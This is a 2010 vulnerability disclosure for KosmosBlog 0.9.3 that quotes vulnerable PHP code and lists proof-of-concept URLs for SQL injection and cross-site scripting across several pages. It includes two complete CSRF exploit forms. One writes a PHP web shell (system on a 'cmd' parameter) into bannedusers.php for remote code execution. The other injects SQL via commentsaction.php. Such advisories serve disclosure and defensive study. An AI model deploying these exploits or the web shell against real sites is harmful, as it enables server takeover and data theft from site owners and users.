KosmosBlog v0.9.3 (SQLi/XSS/CSRF) Multiple Vulnerabilities
==========================================================

[#-----------------------------------------------------------------------------------------------#]
[#] Title: KosmosBlog 0.9.3 (SQLi/XSS/CSRF) Multiple Vulnerabilities
[#] Author: Milos Zivanovic
[#] Date: 22. January 2010.
[#-----------------------------------------------------------------------------------------------#]
[#] Application: KosmosBlog
[#] Version: 0.9.3
[#] Platform: PHP
[#] Link: http://www.kosmosblog.com/KosmosBlog%20-%200.9.3.zip
[#] Vulnerability: SQL Injection, Cross Site Scripting, Cross Site Request Forgery
[#-----------------------------------------------------------------------------------------------#]
 
http://www.kosmosblog.com/index.php
 
[#]Content
|
|--Everybody
| |--SQL Injection
| | |--index.php (GET kategorija)
| | |--index.php (GET id)
| | |--index.php (GET monthID)
| | |--index.php (GET yearID)
| | |--register.php (POST username & email)
| |
| |--Cross Site Scripting
| |--addcomment.php (GET id)
|
|--Logged in users
|--Persistent Cross Site Scripting
| |--addcontentgo.php (POST naslov)
|
|--SQL Injection
| |--deletecontent.php (GET id)
| |--usermanager.php (GET id)
|
|--Cross Site Request Forgery To Remote Code Execution
| |--bannedusers.php
|
|--Cross Site Request Forgery To SQL Injection
|--commentsaction.php
 
[~] EVERYBODY
 
[*] SQL INJECTION
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/mainincludes/templates/blackkosmos/indextmplt.php
if (isset($_GET[&#039;kategorija&#039;])) {
generisivesti($_GET[&#039;kategorija&#039;]);
} elseif (isset($_GET[&#039;id&#039;])) {
generisivesti(0,$_GET[&#039;id&#039;],0);
// function generisivesti does not sanitize input variable before passing it to mysql query
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]index.php (GET kategorija)
 
[POC----------------------------------------------------------------------------------------------]
http://kosmos/index.php?kategorija=[SQL_Injection]
[POC----------------------------------------------------------------------------------------------]
 
[-]index.php (GET id)
 
[POC----------------------------------------------------------------------------------------------]
http://kosmos/index.php?id=1&#039;[SQL_Injection]
[POC----------------------------------------------------------------------------------------------]
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/funkcije.php
if (isset($_GET[&#039;yearID&#039;]))
{
$date_yearID = $_GET[&#039;yearID&#039;];
} else {
$date_yearID = $date[&#039;year&#039;];
}
 
if (isset($_GET[&#039;monthID&#039;]))
{
$date_monthID = $_GET[&#039;monthID&#039;];
} else {
$date_monthID = $date[&#039;month&#039;];
}
....
$eventQuery = mysql_query("... LIKE &#039;".$date_yearID."-".$date_monthID...);
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]index.php (GET monthID)
 
[POC----------------------------------------------------------------------------------------------]
http://kosmos/index.php?yearID=2010&monthID=2&#039;[SQL_Injection]
[POC----------------------------------------------------------------------------------------------]
 
[-]index.php (GET yearID)
 
[POC----------------------------------------------------------------------------------------------]
http://kosmos/index.php?yearID=2010&#039;[SQL_Injection]&monthID=2
[POC----------------------------------------------------------------------------------------------]
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/register.php
$userN = $_POST[&#039;user&#039;];
...
$mail = $_POST[&#039;mail&#039;];
...
mysql_query("... VALUES(&#039;$userN&#039;, &#039;$loz&#039;, &#039;$mail&#039;, ...
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]register.php (POST username & email)
 
[POC----------------------------------------------------------------------------------------------]
http://kosmos/register.php
[POC----------------------------------------------------------------------------------------------]
 
In username and email fields we can inject our SQL code.
 
 
[*] CROSS SITE SCRIPTING
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/addcomment.php
if ($_GET[&#039;page&#039;] == &#039;add&#039;){
$link = "../index.php?id=".$_GET[&#039;id&#039;];
}
?>
...
<META HTTP-EQUIV="refresh" content="3;URL=<?php echo $link; ?>">
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]addcomment.php (GET id)
 
[POC----------------------------------------------------------------------------------------------]
http://kosmos/administration/addcomment.php?page=add&id="[XSS]
[POC----------------------------------------------------------------------------------------------]
 
 
[~] LOGGED IN USERS
 
[*] PERSISTENT CROSS SITE SCRIPTING
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/addcontentgo.php
switch ($_POST[&#039;type&#039;]) {
case "blogpost":
$title = $_POST[&#039;title&#039;];
...
$sql = "INSERT INTO main_kosmos_blog SET naslov = &#039;$title&#039;...
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]addcontentgo.php (POST naslov)
 
When adding new post to blog, field &#039;naslov&#039; is not sanitized. Here can also be used SQL Injection but, there are much better positions for SQLi attack, so i&#039;ve chosen Persistent XSS for this one.
 
 
[*] SQL INJECTION
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/deletecontent.php
$id = $_GET[&#039;id&#039;];
...
$result = @mysql_query("SELECT * FROM main_kosmos_blog WHERE id = &#039;".$id."&#039; ;");
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]deletecontent.php (GET id)
 
[POC----------------------------------------------------------------------------------------------]
http://kosmos/administration/deletecontent.php?action=blogpost&id=1&#039;[SQL_Injection]
[POC----------------------------------------------------------------------------------------------]
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/usermanager.php
$result3 = @mysql_query(...`users_kosmos_blog` WHERE id=&#039;".$_GET[&#039;id&#039;]...
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]usermanager.php (GET id)
 
[POC----------------------------------------------------------------------------------------------]
http://kosmos/administration/usermanager.php?action=obradi&id=1&#039;[SQL_Injection]
[POC----------------------------------------------------------------------------------------------]
 
 
[*] CROSS SITE REQUEST FORGERY TO REMOTE CODE EXECUTION
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/bannedusers.php
$file=fopen("mainincludes/bannedusers.php","w");
$banned = $_POST[&#039;banned&#039;];
fwrite ($file,$banned);
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]bannedusers.php
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form method="post" action="http://kosmos/administration/bannedusers.php?action=process">
<input type="hidden" name="banned" value="<?php @system($_GET[&#039;cmd&#039;]); ?>">
<input type="hidden" name="type" value="link">
<input type="submit" name="submit" value="Snimi">
</form>
[EXPLOIT------------------------------------------------------------------------------------------]
 
After logged in user run this exploit, php code will be written into .php file and it will be ready to execute. File to run after successful exploitation:
http://kosmos/administration/mainincludes/bannedusers.php
 
 
[*] CROSS SITE REQUEST FORGERY TO SQL INJECTION
 
Vulnerable Code:
 
[VULNERABLE CODE----------------------------------------------------------------------------------]
// /kosmos/administration/commentsaction.php
$id = $_POST[&#039;ids&#039;];
...
for ($i = 0; $i < count($id); $i++) {
$idd = $id[$i];
...
$sql = "DELETE FROM `comments_kosmos_blog` WHERE id=&#039;".$idd."&#039;";
[VULNERABLE CODE----------------------------------------------------------------------------------]
 
[-]commentsaction.php
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form method="post" action="http://kosmos/administration/commentsaction.php">
<input type="hidden" name="action" value="Obri?i">
<input type="hidden" name="ids[]" value="1&#039;[SQL_Injection]">
<input type="submit" name="submit">
</form>
[EXPLOIT------------------------------------------------------------------------------------------]



